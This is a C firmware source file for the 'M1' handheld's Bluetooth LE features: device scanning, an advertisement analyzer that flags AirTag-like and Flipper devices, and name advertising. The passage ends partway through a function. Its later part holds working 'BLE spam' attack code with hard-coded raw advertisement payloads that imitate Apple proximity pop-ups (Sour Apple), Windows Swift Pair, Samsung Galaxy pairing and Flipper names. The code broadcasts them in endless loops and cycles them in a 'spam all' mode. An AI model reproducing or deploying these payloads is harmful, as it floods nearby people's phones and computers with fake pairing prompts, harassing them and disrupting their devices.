/*
*
* m1_bt.c
*
* Source for M1 bluetooth (NimBLE binary SPI protocol)
*
* M1 Project
*
*/

/*************************** I N C L U D E S **********************************/

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "stm32h5xx_hal.h"
#include "main.h"
#include "m1_bt.h"
#include "m1_esp32_hal.h"
#include "m1_esp32_cmd.h"
#include "m1_virtual_kb.h"
#include "ff.h"
#include "m1_compile_cfg.h"
#include "m1_display.h"
#include "m1_lcd.h"
#include "m1_scene.h"

/*************************** D E F I N E S ************************************/

#define M1_LOGDB_TAG            "BLE"

#define M1_GUI_ROW_SPACING      1

#define BLE_SCAN_TIMEOUT_MS     8000
#define BLE_CMD_TIMEOUT_MS      2000
#define BLE_NEXT_TIMEOUT_MS     1000

#define BLE_DEV_MAX             32
#define BLE_ADV_NAME_MAX        29
#define BLE_CFG_FILE            "bt.cfg"

//************************** S T R U C T U R E S *******************************

typedef struct {
    uint8_t  addr[6];
    uint8_t  addr_type;
    int8_t   rssi;
    char     name[30];
    char     addr_str[18]; /* "XX:XX:XX:XX:XX:XX" */
} ble_dev_t;

/***************************** V A R I A B L E S ******************************/

static ble_dev_t *ble_list = NULL;
static uint16_t ble_count = 0;
static uint16_t ble_view_idx = 0;
static char ble_adv_name[BLE_ADV_NAME_MAX + 1] = "SiN360-M1";
static bool ble_adv_name_loaded = false;

/********************* F U N C T I O N   P R O T O T Y P E S ******************/

void menu_bluetooth_init(void);
void bluetooth_config(void);
void bluetooth_scan(void);
void bluetooth_advertise(void);

static void ble_list_free(void);
static uint16_t ble_list_print(bool up_dir);

/*************** F U N C T I O N   I M P L E M E N T A T I O N ****************/

void menu_bluetooth_init(void)
{
    ;
}

static void ble_trim_line(char *s)
{
    size_t len;

    if (!s) return;
    len = strlen(s);
    while (len > 0 && (s[len - 1] == '\r' || s[len - 1] == '\n' || s[len - 1] == ' '))
    {
        s[len - 1] = '\0';
        len--;
    }
}

static bool ble_adv_name_valid_char(char c)
{
    return (c >= 32 && c <= 126);
}

static void ble_adv_name_set(const char *name)
{
    uint8_t out = 0;

    if (!name || name[0] == '\0') return;

    for (uint8_t i = 0; name[i] && out < BLE_ADV_NAME_MAX; i++)
    {
        if (ble_adv_name_valid_char(name[i]))
        {
            ble_adv_name[out++] = name[i];
        }
    }

    if (out > 0)
    {
        ble_adv_name[out] = '\0';
    }
}

static void ble_adv_name_load(void)
{
    FIL fil;
    char line[48];

    if (ble_adv_name_loaded) return;
    ble_adv_name_loaded = true;

    if (f_open(&fil, BLE_CFG_FILE, FA_READ) != FR_OK)
    {
        return;
    }

    while (f_gets(line, sizeof(line), &fil) != NULL)
    {
        ble_trim_line(line);
        if (strncmp(line, "adv_name=", 9) == 0)
        {
            ble_adv_name_set(&line[9]);
            break;
        }
    }

    f_close(&fil);
}

static void ble_adv_name_save(void)
{
    FIL fil;
    UINT bw;
    char line[48];

    if (f_open(&fil, BLE_CFG_FILE, FA_WRITE | FA_CREATE_ALWAYS) != FR_OK)
    {
        return;
    }

    snprintf(line, sizeof(line), "adv_name=%s\n", ble_adv_name);
    f_write(&fil, line, strlen(line), &bw);
    f_close(&fil);
}

static const char *ble_adv_name_get(void)
{
    ble_adv_name_load();
    return ble_adv_name;
}


/* ---- ESP32 init helper (same pattern as WiFi) ---- */
static void ble_ensure_esp32_ready(void)
{
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    if (!m1_esp32_get_init_status())
    {
        m1_esp32_init();
        m1_u8g2_firstpage();
        u8g2_DrawStr(&m1_u8g2, 6, 15, "Starting ESP32...");
        m1_u8g2_nextpage();

        HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_RESET);
        HAL_Delay(200);
        HAL_GPIO_WritePin(ESP32_EN_GPIO_Port, ESP32_EN_Pin, GPIO_PIN_SET);
        HAL_Delay(2000);
    }
}


static void ble_list_free(void)
{
    if (ble_list)
    {
        free(ble_list);
        ble_list = NULL;
    }
    ble_count = 0;
    ble_view_idx = 0;
}

static void ble_show_pending(const char *title, const char *line1, const char *line2)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;

    m1_u8g2_firstpage();
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    u8g2_DrawStr(&m1_u8g2, 2, 10, title);
    u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);
    u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
    if (line1) u8g2_DrawStr(&m1_u8g2, 2, 26, line1);
    if (line2) u8g2_DrawStr(&m1_u8g2, 2, 38, line2);
    m1_u8g2_nextpage();

    while (1)
    {
        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
        {
            xQueueReceive(button_events_q_hdl, &btn, 0);
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                xQueueReset(main_q_hdl);
                break;
            }
        }
    }
}


/*============================================================================*/
/**
  * @brief Perform BLE scan using the binary SPI protocol
  * @retval Number of devices found, 0 on error
  */
/*============================================================================*/
static uint16_t ble_do_scan(void)
{
    m1_resp_t resp;
    int ret;

    ble_list_free();

    /* BLE_SCAN_START blocks on ESP32 for ~5s (NimBLE scan duration) */
    ret = m1_esp32_simple_cmd(CMD_BLE_SCAN_START, &resp, BLE_SCAN_TIMEOUT_MS);
    if (ret != 0 || resp.status != RESP_OK)
    {
        M1_LOG_I(M1_LOGDB_TAG, "BLE scan start failed: ret=%d status=%d\n\r", ret, resp.status);
        return 0;
    }

    uint16_t count = resp.payload[0] | ((uint16_t)resp.payload[1] << 8);
    if (count == 0)
        return 0;

    if (count > BLE_DEV_MAX)
        count = BLE_DEV_MAX;

    ble_list = (ble_dev_t *)malloc(count * sizeof(ble_dev_t));
    if (!ble_list)
        return 0;

    memset(ble_list, 0, count * sizeof(ble_dev_t));

    for (uint16_t i = 0; i < count; i++)
    {
        ret = m1_esp32_simple_cmd(CMD_BLE_SCAN_NEXT, &resp, BLE_NEXT_TIMEOUT_MS);
        if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 9)
            break;

        /* Unpack: [0]=rssi, [1]=addr_type, [2..7]=addr, [8]=name_len, [9..]=name */
        ble_list[i].rssi = (int8_t)resp.payload[0];
        ble_list[i].addr_type = resp.payload[1];
        memcpy(ble_list[i].addr, &resp.payload[2], 6);
        uint8_t name_len = resp.payload[8];
        if (name_len > 29) name_len = 29;
        if (name_len > 0)
            memcpy(ble_list[i].name, &resp.payload[9], name_len);
        ble_list[i].name[name_len] = '\0';

        snprintf(ble_list[i].addr_str, sizeof(ble_list[i].addr_str),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            ble_list[i].addr[0], ble_list[i].addr[1], ble_list[i].addr[2],
            ble_list[i].addr[3], ble_list[i].addr[4], ble_list[i].addr[5]);

        ble_count++;
    }

    return ble_count;
}


/*============================================================================*/
/**
  * @brief Display one BLE device from the list, scroll up/down
  */
/*============================================================================*/
static uint16_t ble_list_print(bool up_dir)
{
    char prn_msg[25];
    uint8_t y_offset;

    if (ble_count == 0 || !ble_list)
        return 0;

    if (up_dir)
    {
        if (ble_view_idx == 0)
            ble_view_idx = ble_count - 1;
        else
            ble_view_idx--;
    }
    else
    {
        ble_view_idx++;
        if (ble_view_idx >= ble_count)
            ble_view_idx = 0;
    }

    ble_dev_t *d = &ble_list[ble_view_idx];

    m1_u8g2_firstpage();
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    u8g2_DrawStr(&m1_u8g2, 2, 10, "BLE Devices:");

    snprintf(prn_msg, sizeof(prn_msg), "%d/%d", ble_view_idx + 1, ble_count);
    u8g2_DrawStr(&m1_u8g2, M1_LCD_DISPLAY_WIDTH - 6 * M1_GUI_FONT_WIDTH,
        10, prn_msg);
    u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);

    y_offset = 14 + M1_GUI_FONT_HEIGHT - 1;

    /* Name or "(no name)" */
    if (d->name[0])
        u8g2_DrawStr(&m1_u8g2, 2, y_offset, d->name);
    else
        u8g2_DrawStr(&m1_u8g2, 2, y_offset, "(no name)");

    y_offset += M1_GUI_FONT_HEIGHT + M1_GUI_ROW_SPACING;

    /* Address */
    u8g2_DrawStr(&m1_u8g2, 2, y_offset, d->addr_str);
    y_offset += M1_GUI_FONT_HEIGHT;

    /* RSSI and address type */
    snprintf(prn_msg, sizeof(prn_msg), "RSSI:%ddBm Type:%d", d->rssi, d->addr_type);
    u8g2_DrawStr(&m1_u8g2, 2, y_offset, prn_msg);

    m1_u8g2_nextpage();

    return ble_count;
}

typedef enum {
    BLE_RAW_ANALYZER = 0,
    BLE_RAW_AIRTAG,
    BLE_RAW_FLIPPER,
} ble_raw_mode_t;

static bool ble_adv_next_field(const uint8_t *adv, uint8_t adv_len, uint8_t *idx,
    uint8_t *type, const uint8_t **data, uint8_t *data_len)
{
    while (*idx < adv_len)
    {
        uint8_t field_len = adv[*idx];
        (*idx)++;

        if (field_len == 0) continue;
        if (*idx + field_len > adv_len) return false;

        *type = adv[*idx];
        *data = &adv[*idx + 1];
        *data_len = field_len - 1;
        *idx += field_len;
        return true;
    }

    return false;
}

static char ble_ascii_lower(char c)
{
    if (c >= 'A' && c <= 'Z') return c + ('a' - 'A');
    return c;
}

static bool ble_bytes_contains_text(const uint8_t *data, uint8_t data_len, const char *needle)
{
    uint8_t needle_len = (uint8_t)strlen(needle);

    if (!needle_len || data_len < needle_len) return false;

    for (uint8_t i = 0; i <= data_len - needle_len; i++)
    {
        bool match = true;
        for (uint8_t j = 0; j < needle_len; j++)
        {
            if (ble_ascii_lower((char)data[i + j]) != ble_ascii_lower(needle[j]))
            {
                match = false;
                break;
            }
        }
        if (match) return true;
    }

    return false;
}

static bool ble_adv_name_contains(const uint8_t *adv, uint8_t adv_len, const char *needle)
{
    uint8_t idx = 0;
    uint8_t type;
    const uint8_t *data;
    uint8_t data_len;

    while (ble_adv_next_field(adv, adv_len, &idx, &type, &data, &data_len))
    {
        if ((type == 0x08 || type == 0x09) &&
            ble_bytes_contains_text(data, data_len, needle))
        {
            return true;
        }
    }

    return false;
}

static bool ble_adv_get_name(const uint8_t *adv, uint8_t adv_len, char *name, uint8_t name_len)
{
    uint8_t idx = 0;
    uint8_t type;
    const uint8_t *data;
    uint8_t data_len;

    if (!name || name_len == 0) return false;
    name[0] = '\0';

    while (ble_adv_next_field(adv, adv_len, &idx, &type, &data, &data_len))
    {
        if (type == 0x08 || type == 0x09)
        {
            if (data_len >= name_len) data_len = name_len - 1;
            memcpy(name, data, data_len);
            name[data_len] = '\0';
            return true;
        }
    }

    return false;
}

static bool ble_adv_is_airtag_like(const uint8_t *adv, uint8_t adv_len)
{
    uint8_t idx = 0;
    uint8_t type;
    const uint8_t *data;
    uint8_t data_len;

    while (ble_adv_next_field(adv, adv_len, &idx, &type, &data, &data_len))
    {
        if (type == 0xFF && data_len >= 3 &&
            data[0] == 0x4C && data[1] == 0x00 && data[2] == 0x12)
        {
            return true;
        }
    }

    return false;
}

static void ble_wait_back(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;

    while (1)
    {
        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
        {
            xQueueReceive(button_events_q_hdl, &btn, 0);
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                xQueueReset(main_q_hdl);
                break;
            }
        }
    }
}

static void ble_raw_scan_report(const char *title, ble_raw_mode_t mode)
{
    m1_resp_t resp;
    int ret;
    uint16_t expected;
    uint16_t total = 0;
    uint16_t matches = 0;
    uint16_t apple_count = 0;
    uint16_t flipper_count = 0;
    uint16_t named_count = 0;
    char first_addr[18] = "";
    char first_name[20] = "";
    int8_t first_rssi = 0;
    char ln[26];

    ble_ensure_esp32_ready();

    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    m1_u8g2_firstpage();
    u8g2_DrawStr(&m1_u8g2, 6, 15, title);
    u8g2_DrawStr(&m1_u8g2, 6, 30, "Scanning raw adv...");
    u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
        M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
    m1_u8g2_nextpage();

    ret = m1_esp32_simple_cmd(CMD_BLE_SCAN_START, &resp, BLE_SCAN_TIMEOUT_MS);
    if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 2)
    {
        ble_show_pending(title, "Scan failed", "Check ESP32 FW");
        return;
    }

    expected = resp.payload[0] | ((uint16_t)resp.payload[1] << 8);
    if (expected > BLE_DEV_MAX) expected = BLE_DEV_MAX;

    for (uint16_t i = 0; i < expected; i++)
    {
        ret = m1_esp32_simple_cmd(CMD_BLE_SCAN_NEXT_RAW, &resp, BLE_NEXT_TIMEOUT_MS);
        if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 9) break;

        uint8_t adv_len = resp.payload[8];
        if (adv_len > resp.payload_len - 9) adv_len = resp.payload_len - 9;

        const uint8_t *adv = &resp.payload[9];
        bool has_name = ble_adv_get_name(adv, adv_len, ln, sizeof(ln));
        bool is_airtag = ble_adv_is_airtag_like(adv, adv_len);
        bool is_flipper = ble_adv_name_contains(adv, adv_len, "flipper");
        bool is_match = (mode == BLE_RAW_ANALYZER) ||
            (mode == BLE_RAW_AIRTAG && is_airtag) ||
            (mode == BLE_RAW_FLIPPER && is_flipper);

        total++;
        if (has_name) named_count++;
        if (is_airtag) apple_count++;
        if (is_flipper) flipper_count++;

        if (is_match)
        {
            matches++;
            if (first_addr[0] == '\0')
            {
                snprintf(first_addr, sizeof(first_addr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    resp.payload[2], resp.payload[3], resp.payload[4],
                    resp.payload[5], resp.payload[6], resp.payload[7]);
                first_rssi = (int8_t)resp.payload[0];
                if (has_name)
                {
                    strncpy(first_name, ln, sizeof(first_name) - 1);
                    first_name[sizeof(first_name) - 1] = '\0';
                }
            }
        }
    }

    m1_u8g2_firstpage();
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    u8g2_DrawStr(&m1_u8g2, 2, 10, title);
    u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);

    u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
    uint8_t y = 22;
    snprintf(ln, sizeof(ln), "Total:%d Match:%d", total, matches);
    u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;

    if (mode == BLE_RAW_ANALYZER)
    {
        snprintf(ln, sizeof(ln), "Name:%d Apple:%d", named_count, apple_count);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;
        snprintf(ln, sizeof(ln), "Flipper:%d", flipper_count);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln);
    }
    else if (matches > 0)
    {
        u8g2_DrawStr(&m1_u8g2, 2, y, first_addr); y += 9;
        if (first_name[0]) u8g2_DrawStr(&m1_u8g2, 2, y, first_name);
        else
        {
            snprintf(ln, sizeof(ln), "RSSI:%ddBm", first_rssi);
            u8g2_DrawStr(&m1_u8g2, 2, y, ln);
        }
    }
    else
    {
        u8g2_DrawStr(&m1_u8g2, 2, y, "No matches found");
    }

    m1_u8g2_nextpage();

    ble_wait_back();
}


/*============================================================================*/
/**
  * @brief BLE scan: scan for devices and display results
  */
/*============================================================================*/
void bluetooth_scan(void)
{
    S_M1_Buttons_Status this_button_status;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    uint16_t list_count;

    ble_ensure_esp32_ready();

    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    m1_u8g2_firstpage();
    u8g2_DrawStr(&m1_u8g2, 6, 15, "Scanning BLE...");
    u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
        M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
    m1_u8g2_nextpage();

    list_count = ble_do_scan();

    if (list_count == 0)
    {
        m1_u8g2_firstpage();
        u8g2_DrawStr(&m1_u8g2, 6, 15, "BLE Scan");
        u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
            M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
        u8g2_DrawStr(&m1_u8g2, 6, 15 + M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
            "No devices found!");
        m1_u8g2_nextpage();
    }
    else
    {
        ble_view_idx = 1;
        ble_list_print(true);
    }

    while (1)
    {
        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret == pdTRUE)
        {
            if (q_item.q_evt_type == Q_EVENT_KEYPAD)
            {
                ret = xQueueReceive(button_events_q_hdl, &this_button_status, 0);

                if (this_button_status.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
                {
                    ble_list_free();
                    xQueueReset(main_q_hdl);
                    break;
                }
                else if (this_button_status.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
                {
                    if (list_count)
                        ble_list_print(true);
                }
                else if (this_button_status.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
                {
                    if (list_count)
                        ble_list_print(false);
                }
                else if (this_button_status.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
                {
                    ;
                }
            }
        }
    }
}


/*============================================================================*/
/**
  * @brief BLE advertise using binary SPI protocol
  */
/*============================================================================*/
void bluetooth_advertise(void)
{
    S_M1_Buttons_Status this_button_status;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    m1_cmd_t cmd;
    m1_resp_t resp;
    int spi_ret;

    ble_ensure_esp32_ready();

    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    m1_u8g2_firstpage();
    u8g2_DrawStr(&m1_u8g2, 6, 15, "BLE Advertise");
    u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
        M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
    m1_u8g2_nextpage();

    /* Send BLE_ADV_START with the configured device name. */
    memset(&cmd, 0, sizeof(cmd));
    cmd.magic = M1_CMD_MAGIC;
    cmd.cmd_id = CMD_BLE_ADV_START;
    const char *adv_name = ble_adv_name_get();
    uint8_t name_len = (uint8_t)strlen(adv_name);
    if (name_len > BLE_ADV_NAME_MAX) name_len = BLE_ADV_NAME_MAX;
    memcpy(cmd.payload, adv_name, name_len);
    cmd.payload_len = name_len;

    spi_ret = m1_esp32_send_cmd(&cmd, &resp, BLE_CMD_TIMEOUT_MS);

    m1_u8g2_firstpage();
    u8g2_DrawStr(&m1_u8g2, 6, 15, "BLE Advertise");

    if (spi_ret == 0 && resp.status == RESP_OK)
    {
        u8g2_DrawStr(&m1_u8g2, 6, 28, "Broadcasting as:");
        u8g2_DrawStr(&m1_u8g2, 6, 40, adv_name);
    }
    else
    {
        u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
            M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
        u8g2_DrawStr(&m1_u8g2, 6, 15 + M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
            "Failed to start!");
    }
    m1_u8g2_nextpage();

    while (1)
    {
        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret == pdTRUE)
        {
            if (q_item.q_evt_type == Q_EVENT_KEYPAD)
            {
                ret = xQueueReceive(button_events_q_hdl, &this_button_status, 0);

                if (this_button_status.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
                {
                    m1_esp32_simple_cmd(CMD_BLE_ADV_STOP, &resp, BLE_CMD_TIMEOUT_MS);
                    xQueueReset(main_q_hdl);
                    break;
                }
            }
        }
    }
}


/*============================================================================*/
/*  BLE raw adv helper — send raw bytes, show running screen, cycle payloads */
/*============================================================================*/

static void ble_raw_adv_send(const uint8_t *data, uint8_t len)
{
    m1_cmd_t cmd;
    m1_resp_t resp;
    memset(&cmd, 0, sizeof(cmd));
    cmd.magic = M1_CMD_MAGIC;
    cmd.cmd_id = CMD_BLE_ADV_RAW;
    if (len > 31) len = 31;
    memcpy(cmd.payload, data, len);
    cmd.payload_len = len;
    m1_esp32_send_cmd(&cmd, &resp, BLE_CMD_TIMEOUT_MS);
}

static void ble_spam_run_loop(const char *title,
    const uint8_t payloads[][31], const uint8_t *lengths, uint8_t count)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    m1_resp_t resp;
    char ln[26];
    uint32_t start_tick = HAL_GetTick();
    uint8_t idx = 0;
    uint32_t pkt_count = 0;

    while (1)
    {
        ble_raw_adv_send(payloads[idx], lengths[idx]);
        idx = (idx + 1) % count;
        pkt_count++;

        uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

        m1_u8g2_firstpage();
        u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
        u8g2_DrawStr(&m1_u8g2, 2, 10, title);
        u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);

        u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
        uint8_t y = 22;

        snprintf(ln, sizeof(ln), "Packets: %lu", pkt_count);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;

        snprintf(ln, sizeof(ln), "Payloads: %d", count);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;

        snprintf(ln, sizeof(ln), "Time: %lus", elapsed);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln);

        m1_u8g2_nextpage();

        ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(100));
        if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
        {
            xQueueReceive(button_events_q_hdl, &btn, 0);
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                m1_esp32_simple_cmd(CMD_BLE_ADV_STOP, &resp, BLE_CMD_TIMEOUT_MS);
                xQueueReset(main_q_hdl);
                break;
            }
        }
    }
}


/*============================================================================*/
/*  Sour Apple — iOS BLE proximity notifications                             */
/*============================================================================*/

static const uint8_t sour_apple_payloads[][31] = {
    { 0x02, 0x01, 0x06, 0x11, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
      0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
    { 0x02, 0x01, 0x06, 0x11, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
      0x06, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
    { 0x02, 0x01, 0x06, 0x11, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
      0x20, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
    { 0x02, 0x01, 0x06, 0x11, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
      0x0B, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
};
static const uint8_t sour_apple_lens[] = { 20, 20, 20, 20 };

void ble_spam_sour_apple(void)
{
    ble_ensure_esp32_ready();
    ble_spam_run_loop("SOUR APPLE",
        sour_apple_payloads, sour_apple_lens, 4);
}


/*============================================================================*/
/*  Swiftpair — Windows BLE pairing notifications                            */
/*============================================================================*/

static const uint8_t swiftpair_payloads[][31] = {
    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
      0x06, 0xFF, 0x06, 0x00, 0x03, 0x80, 0x00 },
    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
      0x06, 0xFF, 0x06, 0x00, 0x03, 0x80, 0x01 },
    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
      0x06, 0xFF, 0x06, 0x00, 0x03, 0x80, 0x02 },
    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
      0x06, 0xFF, 0x06, 0x00, 0x03, 0x80, 0x03 },
};
static const uint8_t swiftpair_lens[] = { 14, 14, 14, 14 };

void ble_spam_swiftpair(void)
{
    ble_ensure_esp32_ready();
    ble_spam_run_loop("SWIFTPAIR",
        swiftpair_payloads, swiftpair_lens, 4);
}


/*============================================================================*/
/*  Samsung BLE — Galaxy device pairing notifications                        */
/*============================================================================*/

static const uint8_t samsung_payloads[][31] = {
    { 0x02, 0x01, 0x06, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x01,
      0x02, 0xA0, 0x01, 0x50, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x11,
      0x06, 0xEE, 0x7D, 0x21, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 },
    { 0x02, 0x01, 0x06, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x01,
      0x02, 0xA0, 0x02, 0x50, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x11,
      0x06, 0xEE, 0x7D, 0x21, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02 },
    { 0x02, 0x01, 0x06, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x01,
      0x02, 0xA0, 0x03, 0x50, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x11,
      0x06, 0xEE, 0x7D, 0x21, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03 },
    { 0x02, 0x01, 0x06, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x01,
      0x02, 0xA0, 0x04, 0x50, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x11,
      0x06, 0xEE, 0x7D, 0x21, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04 },
};
static const uint8_t samsung_lens[] = { 31, 31, 31, 31 };

void ble_spam_samsung(void)
{
    ble_ensure_esp32_ready();
    ble_spam_run_loop("SAMSUNG BLE",
        samsung_payloads, samsung_lens, 4);
}


/*============================================================================*/
/*  Flipper BLE Spam — name advertisements                                   */
/*============================================================================*/

static const uint8_t flipper_payloads[][31] = {
    { 0x02, 0x01, 0x06, 0x0D, 0x09, 'F', 'l', 'i', 'p', 'p', 'e', 'r',
      ' ', 'Z', 'e', 'r', 'o' },
    { 0x02, 0x01, 0x06, 0x0C, 0x09, 'F', 'l', 'i', 'p', 'p', 'e', 'r',
      ' ', 'B', 'L', 'E' },
    { 0x02, 0x01, 0x06, 0x0C, 0x09, 'F', 'l', 'i', 'p', 'p', 'e', 'r',
      '_', 'Z', 'e', 'r' },
    { 0x02, 0x01, 0x06, 0x08, 0x09, 'F', 'l', 'i', 'p', 'p', 'e', 'r' },
};
static const uint8_t flipper_lens[] = { 17, 16, 16, 12 };

void ble_spam_flipper(void)
{
    ble_ensure_esp32_ready();
    ble_spam_run_loop("FLIPPER BLE",
        flipper_payloads, flipper_lens, 4);
}


/*============================================================================*/
/*  BLE Spam All — cycle through all payload types                           */
/*============================================================================*/

void ble_spam_all(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    m1_resp_t resp;
    char ln[26];
    uint32_t start_tick;
    uint32_t pkt_count = 0;
    uint8_t type_idx = 0;

    ble_ensure_esp32_ready();
    start_tick = HAL_GetTick();

    while (1)
    {
        uint8_t sent_type = type_idx;

        switch (type_idx)
        {
        case 0:
            for (uint8_t i = 0; i < 4; i++)
                ble_raw_adv_send(sour_apple_payloads[i], sour_apple_lens[i]);
            break;
        case 1:
            for (uint8_t i = 0; i < 4; i++)
                ble_raw_adv_send(swiftpair_payloads[i], swiftpair_lens[i]);
            break;
        case 2:
            for (uint8_t i = 0; i < 4; i++)
                ble_raw_adv_send(samsung_payloads[i], samsung_lens[i]);
            break;
        case 3:
            for (uint8_t i = 0; i < 4; i++)
                ble_raw_adv_send(flipper_payloads[i], flipper_lens[i]);
            break;
        }
        type_idx = (type_idx + 1) % 4;
        pkt_count += 4;

        uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

        m1_u8g2_firstpage();
        u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
        u8g2_DrawStr(&m1_u8g2, 2, 10,
            "BLE SPAM ALL");
        u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);

        u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
        uint8_t y = 22;

        snprintf(ln, sizeof(ln), "Packets: %lu", pkt_count);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;

        const char *names[] = {"Apple", "Windows", "Samsung", "Flipper"};
        snprintf(ln, sizeof(ln), "Current: %s", names[sent_type]);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;

        snprintf(ln, sizeof(ln), "Time: %lus", elapsed);
        u8g2_DrawStr(&m1_u8g2, 2, y, ln);

        m1_u8g2_nextpage();

        ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(100));
        if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
